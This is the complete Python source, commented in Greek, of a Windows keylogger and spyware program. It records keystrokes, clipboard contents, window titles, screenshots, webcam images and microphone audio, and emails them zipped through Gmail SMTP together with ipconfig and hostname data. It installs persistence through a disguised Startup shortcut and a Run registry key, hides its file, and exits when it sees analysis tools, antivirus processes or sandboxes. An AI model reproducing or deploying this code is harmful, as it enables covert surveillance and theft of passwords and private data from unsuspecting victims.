import subprocess  # Εκτέλεση εξωτερικών εντολών συστήματος
import pynput.keyboard  # Παρακολούθηση πληκτρολογίου
import threading  # Διαχείριση πολλαπλών νημάτων
import smtplib  # Αποστολή email μέσω SMTP
import mss
import pyperclip  # Πρόσβαση στο περιεχόμενο του clipboard
import win32gui  # Απόκτηση τίτλου ενεργού παραθύρου
import winreg  # Πρόσβαση στο μητρώο των Windows (δεν χρησιμοποιείται τελικά)
import hashlib  # Δημιουργία hash για έλεγχο αλλαγών στα αρχεία
import psutil  # Παρακολούθηση ενεργών διεργασιών (anti-analysis)
import time  # Χρονικές λειτουργίες
import os  # Διαχείριση αρχείων
import shutil # shell utilities
import platform
import sys
import sounddevice as sd
import soundfile as sf
import numpy as np
import wave
import random
import urllib.request
import re
import cv2 
import zipfile
import io
# Βιβλιοθήκες για αποστολή email με συνημμένα

from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
from datetime import datetime
from threading import Thread, Event

# Βιβιλιοθήκη για το ποντίκι 
from pynput import mouse
from pynput.mouse import Button

#Client
from win32com.client import Dispatch

EMAIL = "your_email@gmail.com"
PASSWORD = "your_app_password"

# Max size folder
MAX_STORAGE_MB = 1000

# Δημιουργία της κύριας κλάσης του keylogger
class Keylogger:
    def __init__(self):
        self.email = EMAIL
        self.password = PASSWORD

        self.pressed_keys = set()

        self.last_window = ""
        self.last_clipboard = ""
        self.key_buffer = ""

        self.last_action_time = 0
        self._last_storage_check = 0
        self._storage_full_cache = False
        self.sct = mss.mss()

        self.webcam_index = 0 # Παίρνει την 1η κάμερα
        self.failed_attempts = 0
        self.is_recording = False # Ξεκινά σε False το μικρόφωνο

        temp_env = os.getenv("TEMP") or os.getenv("TMP") or "C:\\Temp"
        self.base_temp = os.path.join(temp_env, "SysInternal")
        self.screenshot_audio_dir = os.path.join(self.base_temp, "ImDir")
        self.log_dir = os.path.join(self.base_temp, "TexDir")
        os.makedirs(self.screenshot_audio_dir, exist_ok=True)
        os.makedirs(self.log_dir, exist_ok=True)

        self.log_file = os.path.join(self.log_dir, "log.txt")

   # Εμφάνιση τίτλων παραθύρων στο οποίο βρίσκεται ο χρήστης 
    def get_active_window(self):
        try:
            return win32gui.GetWindowText(win32gui.GetForegroundWindow()) or "UnknownWindow"
        except:
            return "UnknownWindow"

    # Διαγράφει τα παλαιότερα αρχεία ενός φακέλου
    def delete_oldest_files(self, folder, max_delete=5):
        files = [os.path.join(folder, f) for f in os.listdir(folder)
                 if os.path.isfile(os.path.join(folder, f))]
        files.sort(key=os.path.getmtime)  

        files_to_delete = files[:max_delete]  # μόνο τα 5 παλαιότερα

        for f in files_to_delete:
            try:
                os.remove(f)
            except Exception as e:
                print(f"[!] Σφάλμα διαγραφής {f}: {e}")

    # Διαγράφει αρχεία αν ξεπεραστεί το επιτρεπτό όριο αποθήκευσης
    def cleanup_storage(self):
        print("[!] Το SysInternal ξεπέρασε τα 1000MB. Διαγράφω αρχεία...")
        self.delete_oldest_files(self.screenshot_audio_dir, max_delete=5)

    # Ελέγχει αν το συνολικό μέγεθος του φακέλου υπερβαίνει τα 1000MB και καθαρίζει αν χρειάζεται
    def cleanup_if_storage_full(self):
        while is_storage_full(self.base_temp):
            self.cleanup_storage()

   # Προσθέτει καταγραφή με timestamp στο αρχείο log, μαζί με αλλαγή παραθύρου αν χρειάζεται.
    def write_to_log(self, text):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        window = self.get_active_window()

        # Αν άλλαξε παράθυρο, γράψε την ένδειξη παραθύρου
        if not hasattr(self, "last_window"):
            self.last_window = ""

        with open(self.log_file, "a", encoding="utf-8") as f:
            if window != self.last_window:
                f.write(f"\n[{timestamp}] [WINDOW] {window}\n")
                self.last_window = window

            # Κανονική καταγραφή
            f.write(f"[{timestamp}] {text}\n")


    def check_clipboard(self):
        # Αν δεν υπάρχει μεταβλητή για χρονικό throttling, την αρχικοποιεί
        if not hasattr(self, "_last_clipboard_check"):
            self._last_clipboard_check = 0

        now = time.time()

        # Αν δεν έχουν περάσει 2 δευτερόλεπτα από τον τελευταίο έλεγχο, επιστρέφει χωρίς έλεγχο
        if now - self._last_clipboard_check < 2:
            return

        # Ενημερώνει τον χρόνο τελευταίου ελέγχου
        self._last_clipboard_check = now

        try:
            # Παίρνει το περιεχόμενο του clipboard
            content = pyperclip.paste()

            # Αν είναι καινούργιο και δεν είναι κενό, το καταγράφει
            if content and content != self.last_clipboard and content.strip() != "":
                self.last_clipboard = content
                self.write_to_log(f"[CLIPBOARD] {content}")
        except Exception as e:
            # Αν υπάρξει σφάλμα (π.χ. clipboard σε χρήση από άλλο πρόγραμμα)
            print(f"[!] Σφάλμα clipboard: {e}")


    def take_screenshot(self):
        current_time = time.time()
        if current_time - self.last_action_time < 7:  
            return None

        if is_storage_full(self.base_temp):
            print("[!] O χώρος καθαρίστηκε.")
            self.cleanup_storage()
            return None

        filename = datetime.now().strftime("screenshot_%Y-%m-%d_%H-%M-%S.png")
        path = os.path.join(self.screenshot_audio_dir, filename)
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            sct_img = sct.grab(monitor)
            mss.tools.to_png(sct_img.rgb, sct_img.size, output=path)

        self.last_action_time = current_time  
        return path


    # Ελέγχει έαν καταγράφει το μικρόφωνο
    def is_microphone_recording(self):
        if self.is_recording:
            print("[!] Ηχογράφηση ήδη σε εξέλιξη – αγνόηση")
            return

        self.is_recording = True
        threading.Thread(target=self.record_microphone, daemon=True).start()

    def record_microphone(self, duration=25, filename=None):
        if is_storage_full(self.base_temp):
            print("[!] O χώρος καθαρίστηκε.")
            self.cleanup_storage()
            return None

        filename = datetime.now().strftime("mic_%d-%m-%Y_%H-%M-%S.wav")
        filepath = os.path.join(self.screenshot_audio_dir, filename)

        RATE = 44100
        CHANNELS = 1

        print(f"[+] Η καταγραφή μικροφώνου ξεκίνησε για {duration} δευτερόλεπτα...")

        try:
            # Καταγράφουμε τον ήχο (blocking call)
            recording = sd.rec(int(duration * RATE), samplerate=RATE, channels=CHANNELS, dtype='int16')
            sd.wait()  # Περιμένει να τελειώσει η εγγραφή

            # Αποθηκεύουμε σε wav αρχείο
            sf.write(filepath, recording, RATE)

        except Exception as e:
            print(f"[!] Σφάλμα κατά την ηχογράφηση: {e}")
            filepath = None

        self.is_recording = False
        return filepath

    def on_mouse_click(self, x, y, button, pressed):
        path = None
        if pressed and button == Button.left:
            path = self.take_screenshot()
        if path is not None:
            print("Left click εντοπιστήκε – screenshot")

    def on_press(self, key):
        self.check_clipboard()
        now = time.time()

        try:
            # ✅ Anti-spam: αν το πλήκτρο είναι ήδη πατημένο, μην το ξαναχρησιμοποιήσεις
            if key in self.pressed_keys:
                return
            self.pressed_keys.add(key)

            # 🎥 Αν Caps Lock πατηθεί (με καθυστέρηση), τράβηξε webcam
            if key == pynput.keyboard.Key.tab:
                if now - self.last_action_time > 10:
                    self.last_action_time = now
                    self.capture_webcam_image(filename=f"webcam_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.jpg")

            # 🅰️ Αν πατήθηκε γράμμα/χαρακτήρας
            elif hasattr(key, 'char') and key.char:
                self.key_buffer += key.char

            # 🔄 Space
            elif key == pynput.keyboard.Key.space:
                self.key_buffer += " "

            # ↩️ Enter
            elif key == pynput.keyboard.Key.enter:
                self._flush_key_buffer("[ENTER]")

                if now - self.last_action_time < 7:
                    print("[!] Παρακαλώ περιμένετε πριν ξαναπατήσετε Enter.")
                    return

                self.send_log_and_screenshots(first_time=False)
                self.last_action_time = now

            # ⇧ Shift
            elif key in [pynput.keyboard.Key.shift, pynput.keyboard.Key.shift_r]:
                self._flush_key_buffer("[SHIFT]")
                self.is_microphone_recording()

                if now - self.last_action_time < 25:
                    print("[!] Παρακαλώ περιμένετε πριν ξαναπατήσετε Shift.")
                    return

                self.is_microphone_recording()
                self.last_action_time = now

            # ⌫ Backspace
            elif key == pynput.keyboard.Key.backspace:
                self.key_buffer = self.key_buffer[:-1]

            # 🔘 Όλα τα υπόλοιπα ειδικά πλήκτρα
            elif isinstance(key, pynput.keyboard.Key):
                if key != pynput.keyboard.Key.space:
                    self._flush_key_buffer()
                    self.write_to_log(f"[{key.name.upper()}]")

        except Exception as e:
            print("Σφάλμα στο on_press:", e)
            
    def on_release(self, key):
        if key in self.pressed_keys:
            self.pressed_keys.remove(key)
                

    # Αποθηκεύει το buffer των πλήκτρων και προσθέτει έξτρα ένδειξη αν υπάρχει
    def _flush_key_buffer(self, extra=""):
        combined = f"{self.key_buffer.strip()} {extra.strip()}".strip()
        if combined:
            self.write_to_log(combined)
            self.key_buffer = ""

    def send_log_and_screenshots(self, first_time=False):
        def send():
            msg = MIMEMultipart()
            msg["From"] = self.email
            msg["To"] = self.email

            host_name = self.get_host_name()
            self.get_ipconfig_info()  # καταγραφή ipconfig σε αρχείο

            # Θέμα & σώμα
            if first_time:
                msg["Subject"] = "Ο Χρήστης τρέχει το KeyLogger."
                msg.attach(MIMEText(f"Ο Χρήστης τρέχει το KeyLogger.\n\nHost Name: {host_name}", "plain"))
            else:
                msg["Subject"] = f"Keylogger Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                msg.attach(MIMEText(f"Keylogger ενεργός.\n\nHost Name: {host_name}", "plain"))

                # Δημιουργία προσωρινού zip αρχείου
                zip_buffer = io.BytesIO()
                with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zipf:
                    # --- Προσθήκη log.txt ---
                    log_path = os.path.join(self.log_dir, "log.txt")
                    if os.path.exists(log_path):
                        zipf.write(log_path, arcname="log.txt")

                    # --- Προσθήκη ip_config.txt ---
                    ipconfig_path = os.path.join(self.log_dir, "ip_config.txt")
                    if os.path.exists(ipconfig_path):
                        zipf.write(ipconfig_path, arcname="ip_config.txt")

                    # --- Προσθήκη screenshots/ήχων ---
                    for file in os.listdir(self.screenshot_audio_dir):
                        if file.endswith((".png", ".wav", ".jpg")):
                            fpath = os.path.join(self.screenshot_audio_dir, file)
                            zipf.write(fpath, arcname=file)

                # Επισύναψη zip
                zip_buffer.seek(0)
                part = MIMEBase("application", "zip")
                part.set_payload(zip_buffer.read())
                encoders.encode_base64(part)
                part.add_header("Content-Disposition", "attachment; filename=logs.zip")
                msg.attach(part)

            # Αποστολή Email
            try:
                with smtplib.SMTP("smtp.gmail.com", 587) as server:
                    server.starttls()
                    server.login(self.email, self.password)
                    server.send_message(msg)

                print("[+] Email στάλθηκε")

                # Καθαρισμός μόνο μετά από αποστολή
                if not first_time:
                    for path in [log_path, ipconfig_path]:
                        if os.path.exists(path):
                            os.remove(path)

                    for file in os.listdir(self.screenshot_audio_dir):
                        if file.endswith((".png", ".wav", ".jpg")):
                            os.remove(os.path.join(self.screenshot_audio_dir, file))

                    print("[+] Logs και screenshots διαγράφηκαν.")
            except Exception as e:
                print(f"[!] Σφάλμα αποστολής: {e}")

            # Cleanup μόνο μετά την αποστολή
            self.cleanup_if_storage_full()

        # Τρέξε την αποστολή σε νέο thread (μη μπλοκάρεις το πρόγραμμα)
        threading.Thread(target=send, daemon=True).start()


    def get_ipconfig_info(self):
        try:
            output = subprocess.check_output("ipconfig /all", shell=True).decode(errors="ignore")
            ip_config_path = os.path.join(self.log_dir, "ip_config.txt")
            with open(ip_config_path, "w", encoding="utf-8") as f:
                f.write("Windows IP Configuration Info:\n" + output)
        except Exception as e:
            ip_config_path = os.path.join(self.log_dir, "ip_config.txt")
            with open(ip_config_path, "w", encoding="utf-8") as f:
                f.write(f"Windows IP Configuration Error: {e}")


    def get_host_name(self):
        try:
            output = subprocess.check_output("hostname", shell=True).decode(errors="ignore").strip()
            return output
        except Exception as e:
            return f"Host Name Error: {e}"


    def monitor_for_anti_analysis_tools(self):
        targets = {"Taskmgr.exe", "ProcessHacker.exe", "ProcessExplorer","procexp.exe", "procexp64.exe","autoruns.exe", "avastui.exe","mbam.exe", "wireshark.exe","avp.exe"}
        while True:
            for proc in psutil.process_iter(['name']):
                try:
                    if proc.info['name'] in targets:
                        print(f"[!] Εντοπίστηκε {proc.info['name']} - Τερματισμός.")
                        os._exit(1)
                except:
                    continue
            time.sleep(10)

    def start(self):
        try:
            subprocess.Popen(["msinfo32.exe"], shell=True)
        except Exception as e:
            print(f"Σφάλμα κατά την εκκίνηση msinfo32: {e}")

        threading.Thread(target=self.monitor_for_anti_analysis_tools, daemon=True).start()
        self.send_log_and_screenshots(first_time=True)

        # Keyboard and Mouse Listeners at start
        keyboard_listener = pynput.keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        mouse_listener = mouse.Listener(on_click=self.on_mouse_click)

        keyboard_listener.start()
        mouse_listener.start()

        keyboard_listener.join()
        mouse_listener.join()
   
    def capture_webcam_image(self, filename=None, max_attempts=3):
        if self.failed_attempts >= max_attempts:
            print("[!] Αποτυχία λήψης εικόνας: Too many attempts.")
            return False

        if is_storage_full(self.base_temp):
            self.cleanup_storage(target_mb=50)  # Απελευθερώστε 50MB

        filename = filename or f"webcam_{datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.jpg"
        filepath = os.path.join(self.screenshot_audio_dir, filename)

        cap = None
        try:
            cap = cv2.VideoCapture(self.webcam_index)
            if not cap.isOpened():
                print("[!] Δεν βρέθηκε κάμερα.")
                self.failed_attempts += 1
                return False

            # Stealth: Απενεργοποίηση autofocus/autoexposure (μειώνει θόρυβο)
            cap.set(cv2.CAP_PROP_AUTOFOCUS, 0)
            cap.set(cv2.CAP_PROP_AUTO_EXPOSURE, 0)

            # Λήψη frame
            ret, frame = cap.read()
            if not ret:
                print("[!] Αποτυχία λήψης frame.")
                self.failed_attempts += 1
                return False

            # Αποθήκευση με EXIF metadata
            cv2.imwrite(filepath, frame, [cv2.IMWRITE_JPEG_QUALITY, 85])
            print(f"[+] Εικόνα αποθηκεύτηκε: {filepath}")
            self.failed_attempts = 0  # Reset attempts
            return True

        except Exception as e:
            print(f"[!] Σφάλμα κάμερας: {e}")
            self.failed_attempts += 1
            return False
        finally:
            if cap:
                cap.release()

# Persistance
def add_to_startup():
        # Πλήρης διαδρομή του τρέχοντος αρχείου
        script_path = os.path.realpath(sys.argv[0])

        # Παίρνουμε το όνομα αρχείου χωρίς την επέκταση
        app_name = os.path.splitext(os.path.basename(script_path))[0]

        appdata = os.getenv("APPDATA")
        flag_path = os.path.join(appdata, "Microsoft", "Windows", "SysInternal", "startup_done.flag")

        if os.path.exists(flag_path):
            print("[=] Startup έχει ήδη ρυθμιστεί.")
            return

        target_dir = os.path.join(appdata, "Microsoft", "Windows", "SysInternal")
        os.makedirs(target_dir, exist_ok=True)

        target_script = os.path.join(target_dir, os.path.basename(script_path))
        if not os.path.exists(target_script):
            shutil.copy2(script_path, target_script)

        startup_folder = os.path.join(appdata, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        shortcut_path = os.path.join(startup_folder, f"{app_name}.lnk")

        # Ελέγχει αν δεν υπάρχει ήδη το shortcut στο φάκελο startup
        if not os.path.exists(shortcut_path):
            try:
                # Δημιουργεί ένα COM αντικείμενο για να φτιάξει shortcut στα Windows
                shell = Dispatch("WScript.Shell")
        
                # Δημιουργεί το shortcut αρχείο (.lnk) στη θέση shortcut_path
                shortcut = shell.CreateShortCut(shortcut_path)
        
                # Ορίζει το πρόγραμμα (ή script) που θα τρέχει το shortcut
                shortcut.Targetpath = target_script
        
                # Ορίζει το φάκελο εκτέλεσης για το shortcut
                shortcut.WorkingDirectory = target_dir
        
                # Ορίζει το παράθυρο εκτέλεσης σε ελαχιστοποιημένο (7)
                shortcut.WindowStyle = 7
        
                # Περιγραφή που εμφανίζεται στο shortcut
                shortcut.Description = "System Monitor"
        
                # Αποθηκεύει το shortcut στο δίσκο
                shortcut.save()
        
                print("[+] Προστέθηκε στο startup folder.")
            except Exception as e:
                # Αν υπάρξει κάποιο λάθος στη δημιουργία του shortcut, το εμφανίζει
                print(f"[!] Σφάλμα στη δημιουργία shortcut: {e}")
        else:
            # Αν το shortcut υπάρχει ήδη, εμφανίζει μήνυμα
            print("[=] Shortcut υπάρχει ήδη.")

        # Ελέγχει αν το αρχείο είναι .exe (εκτελέσιμο)
        if script_path.endswith(".exe"):
            try:
                # Ανοίγει το κλειδί registry όπου γίνονται αυτόματες εκτελέσεις στο login χρήστη
                reg_key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0, winreg.KEY_SET_VALUE
                )
        
                # Δημιουργεί ή ενημερώνει την καταχώρηση με το όνομα app_name και την τιμή το path του αρχείου
                winreg.SetValueEx(reg_key, app_name, 0, winreg.REG_SZ, target_script)
        
                # Κλείνει το registry key μετά την ενημέρωση
                winreg.CloseKey(reg_key)
        
                print("[+] Προστέθηκε και στο registry (Run key).")
            except Exception as e:
                # Αν υπάρξει πρόβλημα στην εγγραφή στο registry, το εμφανίζει
                print(f"[!] Σφάλμα registry: {e}")
        else:
            # Αν το αρχείο δεν είναι .exe, δεν προσθέτει καταχώρηση στο registry
            print("[i] Δεν προστέθηκε στο registry.")

        try:
            # Εκτελεί εντολή στο σύστημα για να κάνει το αρχείο "κρυφό" (hidden)
            os.system(f'attrib +h "{target_script}"')
        except Exception:
            # Αν αποτύχει αυτή η εντολή, απλώς την αγνοεί (χωρίς να σταματήσει το πρόγραμμα)
            pass

        try:
            # Δημιουργεί το flag αρχείο που δείχνει ότι η ρύθμιση startup έχει ήδη γίνει
            with open(flag_path, "w") as f:
                f.write("done")
        except Exception as e:
            # Αν δεν μπορεί να δημιουργήσει το flag αρχείο, εμφανίζει το σφάλμα
            print(f"[!] Σφάλμα στη δημιουργία flag αρχείου: {e}")

# Fix
def periodic_sandbox_check(interval=12):
    while True:
        if is_sandbox():
            print("[!] Εντοπίστηκε sandbox κατά τον περιοδικό έλεγχο. Τερματισμός.")
            os._exit(1)
        time.sleep(interval)


def is_sandbox():
    exe_path = os.path.abspath(sys.argv[0]).lower()
    suspicious_indicators = 0
    vm_indicators = ['vbox', 'vmware', 'virtual', 'qemu', 'xen', 'sandboxie']

    # Processes
    for proc in psutil.process_iter(['name']):
        try:
            name = proc.info['name'].lower()
            if any(indicator in name for indicator in vm_indicators):
                print(f"[!] Suspicious process found: {name}")
                suspicious_indicators += 1
        except Exception:
            continue

    # Path detection
    if re.search(r'(temp|rarsfx|7zsfx|sandbox|cuckoo|email|malware|vmshared)', exe_path):
        print(f"[!] Suspicious execution path: {exe_path}")
        suspicious_indicators += 1

    # RAM check
    ram = psutil.virtual_memory().total / (1024 ** 3)
    if ram < 2:
        print(f"[!] Low RAM detected: {ram:.2f} GB")
        suspicious_indicators += 1

    # Disk check
    disk = psutil.disk_usage('/').total / (1024 ** 3)
    if disk < 50:
        print(f"[!] Low disk space detected: {disk:.2f} GB")
        suspicious_indicators += 1

    # Low process count
    process_count = len(psutil.pids())
    if process_count < 50:
        print(f"[!] Low number of running processes: {process_count}")
        suspicious_indicators += 1

    # Απόφαση και "stealth start" συμπεριφορά
    if suspicious_indicators < 2:
        print("[+] No suspicious indicators found. Continuing execution...")
        return False
    else:
        print("[!] Suspicious environment detected. Exiting...")
        sys.exit(1)  # Τερματισμός άμεσα

# Διαγραφη αρχειων 
# Υπολογίζει το συνολικό μέγεθος του base_path σε MB και ελέγχει αν ξεπερνά το όριο
def is_storage_full(base_path):
    total_size = 0
    for dirpath, dirnames, filenames in os.walk(base_path):
        for f in filenames:
            fp = os.path.join(dirpath, f)
            if os.path.isfile(fp):
                total_size += os.path.getsize(fp)
    return total_size / (1024 * 1024) >= MAX_STORAGE_MB

if __name__ == "__main__":
    is_sandbox()
    threading.Thread(target=periodic_sandbox_check, daemon=True).start()
    add_to_startup()
    keylogger = Keylogger()
    keylogger.start() 
